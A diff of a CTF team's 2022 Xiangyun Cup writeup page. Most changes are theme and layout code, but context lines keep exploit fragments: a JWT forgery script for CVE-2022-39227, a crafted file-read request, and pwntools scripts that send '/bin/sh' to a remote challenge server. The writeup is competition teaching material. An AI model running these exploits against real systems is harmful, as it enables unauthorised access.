@@ -12,7 +12,7 @@
  
 
 
-      <title>2022 祥云杯 SU Writeup - </title>
+      <title>2022 祥云杯 SU Writeup - su-team</title>
 
   <meta name="description" content="以下是我们 SU 本次2022 祥云杯 的 writeup ，感谢队里师傅们的辛苦付出！
 同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)">
@@ -66,7 +66,7 @@
   "headline": "2022 祥云杯 SU Writeup",
   "description" : "以下是我们 SU 本次2022 祥云杯 的 writeup ，感谢队里师傅们的辛苦付出！ 同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)\n",
   "inLanguage" : "en",
-  "wordCount":  3138 ,
+  "wordCount":  2318 ,
   "datePublished" : "2022-10-31T07:43:42\u002b08:00",
   "dateModified" : "2022-10-31T07:43:42\u002b08:00",
   "image" : "http:\/\/localhost:1313\/img\/SU.jpg",
@@ -104,55 +104,21 @@
   <link rel="alternate" href="http://localhost:1313/index.xml" type="application/rss+xml" title="su-team"><link rel="stylesheet" href="http://localhost:1313/css/katex.min.css" />
   <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/brands.min.css" />
   <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/fontawesome.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/regular.min.css" />
   <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/solid.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/svg.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/svg-with-js.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/v4-font-face.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/v4-shims.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/v5-font-face.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/css/bootstrap.min.css" /><link rel="stylesheet" href="http://localhost:1313/css/main.css" /><link rel="stylesheet" href="http://localhost:1313/css/fonts.css" /><link rel="stylesheet" href="http://localhost:1313/css/syntax.css" /><link rel="stylesheet" href="http://localhost:1313/css/codeblock.css?v=20260212-fix3" /><link rel="stylesheet" href="http://localhost:1313/css/photoswipe.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/css/photoswipe.default-skin.min.css" /><style>
- 
-.navbar-custom .avatar-container {
-  width: 58px;
-  height: 58px;
-  margin-top: -29px;  
-  left: 50%;
-  transform: translateX(-50%);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  background: #fff;
-  border-radius: 50%;
-  box-shadow: 0 6px 18px rgba(0, 0, 0, 0.12);
-}
+  <link rel="stylesheet" href="http://localhost:1313/css/bootstrap.min.css" /><link rel="stylesheet" href="http://localhost:1313/css/main.css" /><link rel="stylesheet" href="http://localhost:1313/css/fonts.css" /><link rel="stylesheet" href="http://localhost:1313/css/syntax.css" /><link rel="stylesheet" href="http://localhost:1313/css/codeblock.css?v=20260322-1" /><link rel="stylesheet" href="http://localhost:1313/css/photoswipe.min.css" />
+  <link rel="stylesheet" href="http://localhost:1313/css/photoswipe.default-skin.min.css" /><script>
+  (function() {
+    var theme = "dark";
+    try {
+      theme = localStorage.getItem("theme") || "dark";
+    } catch (e) {
+      theme = "dark";
+    }
+    document.documentElement.setAttribute("data-theme", theme === "light" ? "light" : "dark");
+  })();
+</script>
+<link rel="stylesheet" href="/css/team-theme.css?v=20260322-6">
 
-.navbar-custom .avatar-container .avatar-img-border {
-  width: 100%;
-  height: 100%;
-  border-radius: 50%;
-  overflow: hidden;
-  margin: 0;
-  box-shadow: none;
-}
-
-.navbar-custom .avatar-container .avatar-img {
-  width: 100%;
-  height: 100%;
-  object-fit: cover;
-  border-radius: 50%;
-}
-
- 
-@media only screen and (min-width: 768px) {
-  .navbar-custom .avatar-container {
-    width: 72px;
-    height: 72px;
-    margin-top: -36px;  
-  }
-}
-</style>
   </head>
   <body>
     <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
@@ -164,12 +130,17 @@
         <span class="icon-bar"></span>
         <span class="icon-bar"></span>
       </button>
-      <a class="theme-toggle mobile-theme-toggle" href="javascript:void(0)" onclick="toggleTheme()" title="Toggle Theme">
-        <span class="sr-only">Toggle Theme</span>
-        <svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+
+      <a class="navbar-brand" href="/">
+        <span class="navbar-brand__title">su-team</span>
+        <span class="navbar-brand__meta">battle log</span>
+      </a>
+
+      <button type="button" class="theme-toggle mobile-theme-toggle hidden-sm hidden-md hidden-lg" onclick="toggleTheme()" aria-label="Toggle theme">
+        <svg class="theme-icon-moon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
           <path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"></path>
         </svg>
-        <svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <svg class="theme-icon-sun" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
           <circle cx="12" cy="12" r="5"></circle>
           <line x1="12" y1="1" x2="12" y2="3"></line>
           <line x1="12" y1="21" x2="12" y2="23"></line>
@@ -180,8 +151,7 @@
           <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
           <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
         </svg>
-      </a>
-      <a class="navbar-brand" href="http://localhost:1313/">su-team</a>
+      </button>
     </div>
 
     <div class="collapse navbar-collapse" id="main-navbar">
@@ -221,13 +191,12 @@
 
         
 
-        <li class="hidden-xs">
-          <a href="javascript:void(0)" class="theme-toggle" onclick="toggleTheme()" title="Toggle Theme">
-            <span class="sr-only">Toggle Theme</span>
-            <svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <li class="nav-theme-toggle hidden-xs">
+          <button type="button" class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle theme">
+            <svg class="theme-icon-moon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
               <path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"></path>
             </svg>
-            <svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <svg class="theme-icon-sun" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
               <circle cx="12" cy="12" r="5"></circle>
               <line x1="12" y1="1" x2="12" y2="3"></line>
               <line x1="12" y1="21" x2="12" y2="23"></line>
@@ -238,8 +207,9 @@
               <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
               <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
             </svg>
-          </a>
+          </button>
         </li>
+
         
       </ul>
     </div>
@@ -248,93 +218,20 @@
       
       
     
-
   </div>
 </nav>
+
 <script>
-  (function() {
-    const storedTheme = localStorage.getItem("theme");
-    const prefersDark = window.matchMedia("(prefers-color-scheme: dark)").matches;
-    if (storedTheme === "dark" || (!storedTheme && prefersDark)) {
-      document.body.classList.add("dark-mode");
-    } else {
-      document.body.classList.remove("dark-mode");
-    }
-  })();
   function toggleTheme() {
-    const body = document.body;
-    body.classList.toggle("dark-mode");
-    if (body.classList.contains("dark-mode")) {
-      localStorage.setItem("theme", "dark");
-    } else {
-      localStorage.setItem("theme", "light");
-    }
+    var root = document.documentElement;
+    var current = root.getAttribute("data-theme") === "light" ? "light" : "dark";
+    var next = current === "dark" ? "light" : "dark";
+    root.setAttribute("data-theme", next);
+    try {
+      localStorage.setItem("theme", next);
+    } catch (e) {}
   }
 </script>
-<style>
-  .theme-toggle {
-    cursor: pointer;
-    padding: 15px;
-    display: flex;
-    align-items: center;
-  }
-  .mobile-theme-toggle {
-    float: right;
-    padding: 15px 10px;
-    margin-top: 2px;
-  }
-  @media (min-width: 768px) {
-    .mobile-theme-toggle {
-      display: none !important;
-    }
-  }
-  .theme-icon-moon,
-  .theme-icon-sun {
-    color: #777;
-    transition: color .3s, transform .3s;
-  }
-  .theme-toggle:hover .theme-icon-moon,
-  .theme-toggle:hover .theme-icon-sun {
-    color: #333;
-  }
-  .theme-icon-sun {
-    display: none;
-  }
-  .theme-icon-moon {
-    display: block;
-  }
-  body.dark-mode .theme-icon-sun {
-    display: block;
-    color: #000;
-  }
-  body.dark-mode .theme-icon-moon {
-    display: none;
-  }
-  body.dark-mode {
-    filter: none !important;
-    background-color: #1a1a1a !important;
-  }
-  body.dark-mode header,
-  body.dark-mode .container,
-  body.dark-mode footer {
-    filter: invert(1) hue-rotate(180deg);
-  }
-  body.dark-mode .navbar-custom {
-    background-color: #1a1a1a !important;
-    border-bottom: 1px solid #333;
-  }
-  body.dark-mode .navbar-custom .container-fluid {
-    filter: invert(1) hue-rotate(180deg);
-  }
-  body.dark-mode img,
-  body.dark-mode video,
-  body.dark-mode iframe,
-  body.dark-mode .avatar-img,
-  body.dark-mode .navbar-custom .avatar-container {
-    filter: invert(1) hue-rotate(180deg);
-  }
-</style>
-
 
 
 
@@ -420,10 +317,10 @@
   <i class="fas fa-calendar"></i>&nbsp;Posted on October 31, 2022
   
   
-    &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;15&nbsp;min
+    &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;11&nbsp;min
   
   
-    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;3138&nbsp;words
+    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;2318&nbsp;words
   
   
     
@@ -445,14 +342,15 @@
 
 
     
-<div class="container" role="main">
-  
-  <div class="row flex-row">
-    <div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs">
-      <div class="toc-sidebar">
-        <h4 class="toc-title">#<br>TABLE OF CONTENTS</h4>
-        <div class="toc-card">
-          
+
+
+<div class="container post-layout" role="main">
+  <div class="row flex-row post-layout__row">
+    
+      <div class="col-lg-3 col-md-3 hidden-sm hidden-xs">
+        <aside class="toc-sidebar">
+          <h4 class="toc-title">Table of Contents</h4>
+          <div class="toc-card">
             <nav id="TableOfContents">
   <ul>
     <li><a href="#web">Web</a>
@@ -493,14 +391,15 @@
     </li>
   </ul>
 </nav>
-          
-        </div>
+          </div>
+        </aside>
       </div>
-    </div>
-    <div class="col-lg-9 col-md-9">
-  
-      <article role="main" class="blog-post">
-        <p>以下是我们 SU 本次2022 祥云杯 的 writeup ，感谢队里师傅们的辛苦付出！
+      <div class="col-lg-9 col-md-9 post-layout__main">
+    
+
+        <section class="article-shell">
+          <article role="main" class="blog-post">
+            <p>以下是我们 SU 本次2022 祥云杯 的 writeup ，感谢队里师傅们的辛苦付出！
 同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:suers_xctf@126.com">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)</p>
 <hr>
 <p>以下是我们 SU 本次2022 祥云杯 的 writeup ，感谢队里师傅们的辛苦付出！
@@ -510,24 +409,7 @@
 <h2 id="funweb">FunWEB</h2>
 <p>注册一个账号，然后登录，发现是jwt，参考cve-2022-39227，拿官方exp构造越权
 <a href="https://github.com/davedoesdev/python-jwt/blob/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9/test/vulnerability_vows.py">https://github.com/davedoesdev/python-jwt/blob/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9/test/vulnerability_vows.py</a></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">timedelta</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">timedelta</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">json</span> <span class="kn">import</span> <span class="n">loads</span><span class="p">,</span> <span class="n">dumps</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">python_jwt</span> <span class="k">as</span> <span class="nn">jwt</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">jwcrypto.common</span> <span class="kn">import</span> <span class="n">base64url_decode</span><span class="p">,</span> <span class="n">base64url_encode</span>
@@ -540,9 +422,7 @@
 </span></span><span class="line"><span class="cl"><span class="n">parsed_payload</span><span class="p">[</span><span class="s1">&#39;exp&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2000000000</span>
 </span></span><span class="line"><span class="cl"><span class="n">fake_payload</span> <span class="o">=</span> <span class="n">base64url_encode</span><span class="p">((</span><span class="n">dumps</span><span class="p">(</span><span class="n">parsed_payload</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="s1">&#39;:&#39;</span><span class="p">))))</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;{&#34;  &#39;</span> <span class="o">+</span> <span class="n">header</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">fake_payload</span> <span class="o">+</span> <span class="s1">&#39;.&#34;:&#34;&#34;,&#34;protected&#34;:&#34;&#39;</span> <span class="o">+</span> <span class="n">header</span> <span class="o">+</span> <span class="s1">&#39;&#34;, &#34;payload&#34;:&#34;&#39;</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="s1">&#39;&#34;,&#34;signature&#34;:&#34;&#39;</span> <span class="o">+</span> <span class="n">signature</span> <span class="o">+</span> <span class="s1">&#39;&#34;}&#39;</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="/img/2022-xyb-SU-Writeup/1.png" alt="img">
+</span></span></code></pre></div><p><img src="/img/2022-xyb-SU-Writeup/1.png" alt="img">
 生成后就可以开始使用graphql注入，一步步注入获取密码为13Rj2x7VgjCLHIOZSGX0
 <img src="/img/2022-xyb-SU-Writeup/2.png" alt="img">
 登录后查看flag</p>
@@ -554,24 +434,7 @@ cc4可以直接打，但是不出网，所以得打一个tomcat通用回显
 <p>先读src，然后使用/readfile 传入/flag可以进一步看到源码
 <img src="/img/2022-xyb-SU-Writeup/5.png" alt="img">
 参考https://blog.maple3142.net/2022/08/07/corctf-2022-writeups/#rustshop</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">POST</span> <span class="o">/</span><span class="n">readfile</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">POST</span> <span class="o">/</span><span class="n">readfile</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
 </span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="p">:</span> <span class="n">eci</span><span class="o">-</span><span class="mi">2</span><span class="n">zef45s04koksnpurlze</span><span class="o">.</span><span class="n">cloudeci1</span><span class="o">.</span><span class="n">ichunqiu</span><span class="o">.</span><span class="n">com</span><span class="p">:</span><span class="mi">3000</span>
 </span></span><span class="line"><span class="cl"><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">Macintosh</span><span class="p">;</span> <span class="n">Intel</span> <span class="n">Mac</span> <span class="n">OS</span> <span class="n">X</span> <span class="mf">10.15</span><span class="p">;</span> <span class="n">rv</span><span class="p">:</span><span class="mf">106.0</span><span class="p">)</span> <span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="n">Firefox</span><span class="o">/</span><span class="mf">106.0</span>
 </span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="p">:</span> <span class="o">*/*</span>
@@ -584,9 +447,7 @@ cc4可以直接打，但是不出网，所以得打一个tomcat通用回显
 </span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="p">[</span><span class="s2">&#34;file:&#34;</span><span class="p">,</span><span class="s2">&#34;b&#34;</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="p">,</span><span class="s2">&#34;/</span><span class="si">%66%</span><span class="s2">6c</span><span class="si">%61%</span><span class="s2">67&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">]</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h1 id="pwn">pwn</h1>
+</span></span></code></pre></div><h1 id="pwn">pwn</h1>
 <h2 id="ojs">ojs</h2>
 <p>查找关键词可知，这题魔改自项目：https://github.com/ndreynolds/flathead
 比对源码可知，新增了方法<code>charTo</code>
@@ -601,43 +462,7 @@ cc4可以直接打，但是不出网，所以得打一个tomcat通用回显
 <p>此外，这里应该也可以通过改某个<code>got</code>表为<code>puts@plt</code>，然后输入某个<code>got</code>的地址来泄露<code>libc</code>，或者先劫持<code>bss</code>段上的<code>stdin/stdout/stderr</code>指针为某个<code>got</code>表地址，然后比如再改<code>setvbuf</code>的<code>got</code>表为<code>puts@plt</code>，最后劫持执行流到<code>setvbuf</code>来泄露。不过这里貌似不太好泄露完再返回了，但是通过这里泄露的值和上述<code>60*8</code>的位置泄露的<code>libc</code>比对一下就不需要上面的爆破操作了。</p>
 <p>最后，选用如下<code>one_gadget</code>即可：
 <img src="/img/2022-xyb-SU-Writeup/12.png" alt="image"></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;39.106.13.71&#34;</span><span class="p">,</span> <span class="mi">38641</span><span class="p">)</span>
@@ -669,136 +494,10 @@ cc4可以直接打，但是不出网，所以得打一个tomcat通用回显
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="s1">&#39;b = [];&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="s1">&#39;b.push(&#34;winmt&#34;);&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="/img/2022-xyb-SU-Writeup/13.png" alt="image"></p>
+</span></span></code></pre></div><p><img src="/img/2022-xyb-SU-Writeup/13.png" alt="image"></p>
 <h2 id="protocol">protocol</h2>
 <p>protobuf协议，存在一个strcpy造成栈溢出，通过strcpy末尾补0的性质多次刷0组合，避开00截断的问题。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">  1
-</span><span class="lnt">  2
-</span><span class="lnt">  3
-</span><span class="lnt">  4
-</span><span class="lnt">  5
-</span><span class="lnt">  6
-</span><span class="lnt">  7
-</span><span class="lnt">  8
-</span><span class="lnt">  9
-</span><span class="lnt"> 10
-</span><span class="lnt"> 11
-</span><span class="lnt"> 12
-</span><span class="lnt"> 13
-</span><span class="lnt"> 14
-</span><span class="lnt"> 15
-</span><span class="lnt"> 16
-</span><span class="lnt"> 17
-</span><span class="lnt"> 18
-</span><span class="lnt"> 19
-</span><span class="lnt"> 20
-</span><span class="lnt"> 21
-</span><span class="lnt"> 22
-</span><span class="lnt"> 23
-</span><span class="lnt"> 24
-</span><span class="lnt"> 25
-</span><span class="lnt"> 26
-</span><span class="lnt"> 27
-</span><span class="lnt"> 28
-</span><span class="lnt"> 29
-</span><span class="lnt"> 30
-</span><span class="lnt"> 31
-</span><span class="lnt"> 32
-</span><span class="lnt"> 33
-</span><span class="lnt"> 34
-</span><span class="lnt"> 35
-</span><span class="lnt"> 36
-</span><span class="lnt"> 37
-</span><span class="lnt"> 38
-</span><span class="lnt"> 39
-</span><span class="lnt"> 40
-</span><span class="lnt"> 41
-</span><span class="lnt"> 42
-</span><span class="lnt"> 43
-</span><span class="lnt"> 44
-</span><span class="lnt"> 45
-</span><span class="lnt"> 46
-</span><span class="lnt"> 47
-</span><span class="lnt"> 48
-</span><span class="lnt"> 49
-</span><span class="lnt"> 50
-</span><span class="lnt"> 51
-</span><span class="lnt"> 52
-</span><span class="lnt"> 53
-</span><span class="lnt"> 54
-</span><span class="lnt"> 55
-</span><span class="lnt"> 56
-</span><span class="lnt"> 57
-</span><span class="lnt"> 58
-</span><span class="lnt"> 59
-</span><span class="lnt"> 60
-</span><span class="lnt"> 61
-</span><span class="lnt"> 62
-</span><span class="lnt"> 63
-</span><span class="lnt"> 64
-</span><span class="lnt"> 65
-</span><span class="lnt"> 66
-</span><span class="lnt"> 67
-</span><span class="lnt"> 68
-</span><span class="lnt"> 69
-</span><span class="lnt"> 70
-</span><span class="lnt"> 71
-</span><span class="lnt"> 72
-</span><span class="lnt"> 73
-</span><span class="lnt"> 74
-</span><span class="lnt"> 75
-</span><span class="lnt"> 76
-</span><span class="lnt"> 77
-</span><span class="lnt"> 78
-</span><span class="lnt"> 79
-</span><span class="lnt"> 80
-</span><span class="lnt"> 81
-</span><span class="lnt"> 82
-</span><span class="lnt"> 83
-</span><span class="lnt"> 84
-</span><span class="lnt"> 85
-</span><span class="lnt"> 86
-</span><span class="lnt"> 87
-</span><span class="lnt"> 88
-</span><span class="lnt"> 89
-</span><span class="lnt"> 90
-</span><span class="lnt"> 91
-</span><span class="lnt"> 92
-</span><span class="lnt"> 93
-</span><span class="lnt"> 94
-</span><span class="lnt"> 95
-</span><span class="lnt"> 96
-</span><span class="lnt"> 97
-</span><span class="lnt"> 98
-</span><span class="lnt"> 99
-</span><span class="lnt">100
-</span><span class="lnt">101
-</span><span class="lnt">102
-</span><span class="lnt">103
-</span><span class="lnt">104
-</span><span class="lnt">105
-</span><span class="lnt">106
-</span><span class="lnt">107
-</span><span class="lnt">108
-</span><span class="lnt">109
-</span><span class="lnt">110
-</span><span class="lnt">111
-</span><span class="lnt">112
-</span><span class="lnt">113
-</span><span class="lnt">114
-</span><span class="lnt">115
-</span><span class="lnt">116
-</span><span class="lnt">117
-</span><span class="lnt">118
-</span><span class="lnt">119
-</span><span class="lnt">120
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Generated by the protocol buffer compiler.  DO NOT EDIT!</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Generated by the protocol buffer compiler.  DO NOT EDIT!</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># source: ctf.proto</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
@@ -918,28 +617,9 @@ cc4可以直接打，但是不出网，所以得打一个tomcat通用回显
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Login: &#34;</span><span class="p">,</span> <span class="n">login</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="queue">queue</h2>
+</span></span></code></pre></div><h2 id="queue">queue</h2>
 <p>队列结构体</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">struct elem
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">struct elem
 </span></span><span class="line"><span class="cl">{
 </span></span><span class="line"><span class="cl">  _QWORD buf_array_ptr;
 </span></span><span class="line"><span class="cl">  _QWORD sub_buf_max;
@@ -952,9 +632,7 @@ cc4可以直接打，但是不出网，所以得打一个tomcat通用回显
 </span></span><span class="line"><span class="cl">  _QWORD a8;
 </span></span><span class="line"><span class="cl">  _QWORD sub_buf_last;
 </span></span><span class="line"><span class="cl">};
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>666功能可以直接修改结构体
+</span></span></code></pre></div><p>666功能可以直接修改结构体
 伪造结构体再通过其他功能可以实现任意地址读写
 首先需要泄露一个地址
 覆盖pBuffStart, 爆破一个十六进制位到有堆地址的地方
@@ -965,133 +643,7 @@ cc4可以直接打，但是不出网，所以得打一个tomcat通用回显
 然后伪造结构体在__free_hook处
 用程序edit单字节循环写入</p>
 <p>exp</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">  1
-</span><span class="lnt">  2
-</span><span class="lnt">  3
-</span><span class="lnt">  4
-</span><span class="lnt">  5
-</span><span class="lnt">  6
-</span><span class="lnt">  7
-</span><span class="lnt">  8
-</span><span class="lnt">  9
-</span><span class="lnt"> 10
-</span><span class="lnt"> 11
-</span><span class="lnt"> 12
-</span><span class="lnt"> 13
-</span><span class="lnt"> 14
-</span><span class="lnt"> 15
-</span><span class="lnt"> 16
-</span><span class="lnt"> 17
-</span><span class="lnt"> 18
-</span><span class="lnt"> 19
